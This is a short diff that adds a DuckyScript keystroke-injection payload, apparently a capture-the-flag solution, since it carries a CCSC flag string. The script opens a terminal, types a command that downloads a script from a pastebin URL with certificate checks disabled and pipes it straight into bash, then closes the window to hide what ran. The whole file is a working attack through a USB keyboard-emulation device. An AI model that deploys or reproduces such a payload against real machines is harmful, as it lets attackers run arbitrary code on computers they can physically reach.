@@ -1,0 +1,9 @@
+REM part1 
+
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING bash <(curl -ski https://pastebin.com/raw/bLfwPMuM) # CCSC{Dis4bling_USBs_D03s_n0t_Dis4ble_HID}
+DELAY 2000
+
+ALT F4
